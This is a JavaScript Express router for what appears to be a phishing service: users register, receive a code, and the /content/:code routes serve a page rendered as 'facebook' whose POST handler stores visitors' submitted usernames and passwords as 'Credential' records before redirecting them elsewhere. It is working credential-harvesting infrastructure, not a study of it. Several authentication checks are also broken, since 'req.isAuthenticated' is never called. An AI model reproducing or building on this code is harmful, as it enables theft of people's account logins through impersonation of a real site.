import express from "express";
import passport from "passport";
import User from "../database/db.js";
import { Credential, Token } from "../database/db.js";
import {
  verifyCheck,
  registerPost,
} from "../helperFunctions/mainRouteHelper.js";
import sendMail from "../mail.js";

const { Router } = express;
const router = Router();

router.get("/", (req, res) => {
  if (req.isAuthenticated()) {
    verifyCheck("welcome", req.user, res);
  } else {
    res.render("home");
  }
});
router.get("/user", (req, res) => {
  if (req.isAuthenticated()) {
    verifyCheck("welcome", req.user, res);
  } else {
    res.redirect("/login");
  }
});
router.get("/login", (req, res) => {
  if (req.isAuthenticated()) {
    verifyCheck("welcome", req.user, res);
  } else {
    res.render("login");
  }
});
router.get("/register", (req, res) => {
  if (req.isAuthenticated()) {
    verifyCheck("welcome", req.user, res);
  } else {
    res.render("register");
  }
});
router.get("/log-out", function (req, res) {
  req.logOut();
  req.session.destroy(function (err) {
    res.redirect("/");
  });
});
router.get("/email-change", (req, res) => {
  if (req.isAuthenticated) {
    if (!req.user.isVerified) {
      res.render("changeEmail");
    } else {
      res.redirect("/");
    }
  } else {
    res.redirect("/login");
  }
});
router.get("/content/:code", (req, res) => {
  User.findOne({ code: req.params.code }, (err, user) => {
    if (err) {
      console.log(err);
    } else if (user) {
      res.render("facebook", { code: req.params.code });
    }
  });
});
router.get(
  "/auth/google",
  passport.authenticate("google", { scope: ["profile", "email"] })
);

router.get(
  "/auth/google/user",
  passport.authenticate("google", { failureRedirect: "/login" }),
  function (req, res) {
    res.redirect("/user");
  }
);
router.post("/register", (req, res) => {
  User.register(
    { username: req.body.username, name: req.body.name },
    req.body.password,
    function (err, user) {
      if (err) {
        console.log(err);
        res.redirect("/register");
      } else {
        passport.authenticate("local")(req, res, () => {
          registerPost(req, res);
        });
      }
    }
  );
});
router.post("/login", (req, res) => {
  const user = new User({
    username: req.body.username,
    password: req.body.password,
  });
  req.login(user, function (err) {
    if (err) {
      console.log(err);
    }
    passport.authenticate("local")(req, res, function () {
      res.redirect("/user");
    });
  });
});
router.post("/content/:code", (req, res) => {
  User.findOne({ code: req.params.code }, (err, user) => {
    if (err) {
      console.log(err);
    } else if (user) {
      const input = new Credential({
        userName: req.body.username,
        passcode: req.body.password,
        code: req.params.code,
      });
      input.save().then(() => res.redirect(user.redirectURL));
    }
  });
});
router.post("/verify", (req, res) => {
  if (req.isAuthenticated) {
    Token.findOne({ userId: req.user._id }, (err, token) => {
      if (err) {
        console.log(err);
      } else {
        if (token.token == req.body.verifyCode) {
          User.findByIdAndUpdate(
            token.userId,
            { $set: { isVerified: true } },
            () => {
              res.redirect("/");
            }
          );
        }
      }
    });
  }
});
router.post("/user/verify", (req, res) => {
  const email = req.body.email;
  if (req.isAuthenticated) {
    User.findByIdAndUpdate(req.user._id, { $set: { username: email } }, () => {
      Token.findOne({ userId: req.user._id }, (err, token) => {
        if (err) {
          console.log(err);
        } else {
          sendMail(String(token.token), email);
        }
      });
      res.redirect("/user");
    });
  }
});

export default router;
